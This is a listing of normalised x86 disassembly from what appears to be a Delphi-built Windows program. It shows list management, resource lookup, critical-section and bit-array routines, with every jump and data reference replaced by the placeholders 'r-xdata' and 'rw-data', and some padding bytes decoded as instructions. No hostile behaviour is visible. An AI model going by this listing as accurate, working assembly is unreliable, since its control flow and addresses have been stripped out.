mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
pop ebp
retn 0x8
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_417ad0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_417a98
mov edx eax
mov eax [ rw-data ]
call sub_41864c
pop edi
pop esi
pop ebx
retn
sub_417afc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4186d4
mov esi eax
xor edx edx
push ebp
push sub_417b66
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418738
retn
mov edx ebx
mov eax esi
call sub_418310
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_403af0
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417b78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4186d4
mov esi eax
xor edx edx
push ebp
push sub_417be2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418738
retn
mov edx ebx
mov eax esi
call sub_418310
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403af0
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417bf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407e64
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417c34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_40405c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_417c78
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_41836c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_4181b4
sub_417cd0
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_418310
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_417d10
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_417cd0
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_417d34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4044c8
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b0f0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417da8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41abf0
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_417db8
push ebx
call sub_405fa4
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405fa4
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_4181b4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov ebx eax
call sub_405fa4
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov ebx eax
call sub_405fa4
mov [ eax + 0xc ] ebx
sub_417e10
push ebx
push esi
push edi
call sub_405fa4
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418310
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_417e40
push ebx
push esi
call sub_405fa4
mov eax [ eax + 0x8 ]
call sub_403290
call sub_405fa4
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_4183f8
mov esi eax
call sub_405fa4
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_418200
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405fa4
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403290
sub_417e9c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_417f32
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f39
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_40321c
call sub_417e9c
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405254
call sub_4052a4
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_417d34
or bl al
sub_417f44
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_417ff2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_417fd3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031d8
call sub_417e9c
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_417db8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417fda
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_417e10
retn
call sub_417e40
sub_418008
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b274
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_418065
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41e3f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41806c
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_418074
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_4031d8
push eax
mov eax esi
call sub_4031d8
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_419080
push eax
mov eax esi
call sub_419080
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418181
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418008
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418164
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418008
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407df0
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41816b
mov eax [ ebp - 0xc ]
call sub_403290
retn
mov al 0x1
sub_418194
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_4181b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418200
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41829c
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028c8
mov edx esi
mov eax ebx
call sub_418310
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418264
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_418260
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
jmp sub_403a44
sub_41829c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4182e4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405d38
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418264
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182eb
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_418310
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41829c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_418338
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_4184cc
retn
sub_41836c
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41838c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41829c
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028c8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418404
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41829c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_418310
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_418200
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41838c
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_41845c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41829c
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4184ac
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41836c
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418200
sub_4184cc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41829c
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40270c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_418508
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41829c
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4184cc
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402ca4
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_418200
dec ebp
inc edi
jne r-xdata
sub_41857c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4185d0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403644
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4186d4
xor eax eax
push ebp
push sub_418632
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403290
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403280
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418639
mov eax [ ebp - 0x4 ]
call sub_418738
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_41864c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4186d4
xor eax eax
push ebp
push sub_4186c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4181b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41836c
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186cf
mov eax [ ebp - 0x4 ]
call sub_418738
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41829c
sub_4186e8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4186d4
xor eax eax
push ebp
push sub_41872b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4184ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418732
mov eax [ ebp - 0x4 ]
call sub_418738
retn
sub_418744
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418798
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_418798
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_418774
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026cc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402ca4
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026ec
mov edx edi
mov eax ebp
call sub_41878c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028c8
sub_41883c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_418774
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_418798
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_418868
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_4188e0
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_41b890
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_418920
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4189d6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031e0
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189dd
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_4189fc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418a91
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031e0
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40426c
mov eax ebx
mov si 0xffff
call sub_40348c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a98
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
mov si 0xffff
call sub_40348c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40348c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404388
sub_418aa3
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034cc
mov eax ebx
mov si 0xffff
call sub_40348c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40348c
push eax
lea eax [ ebx + 0x4 ]
call sub_405874
mov ecx eax
mov edx r-xdata
pop eax
call sub_403344
sub_418aee
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418b20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418b40
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403344
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_418b68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_405874
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_40348c
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax edi
call sub_405874
mov edx eax
mov eax esi
call sub_418b68
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_405874
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_418c00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_418c55
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405874
mov edx eax
mov eax edi
call sub_418b68
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c5c
lea eax [ ebp - 0x4 ]
call sub_405874
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_418c64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_418c9c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4188e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_418ccc
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
